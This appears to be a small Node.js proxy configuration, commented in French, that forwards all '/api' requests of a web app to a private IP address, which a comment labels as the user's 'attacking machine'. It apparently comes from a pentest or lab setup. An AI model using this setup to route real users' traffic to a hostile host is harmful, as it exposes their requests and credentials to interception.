const { createProxyMiddleware } = require('http-proxy-middleware');

// Configuration du proxy
const proxy = createProxyMiddleware({
  target: 'http://10.101.11.83:5000', // L'adresse IP de votre machine attaquante
  changeOrigin: true, // Important pour les requêtes cross-origin (CORS)
  // Vous pouvez ajouter d'autres options si nécessaire
});

module.exports = function (app) {
  app.use('/api', proxy);
};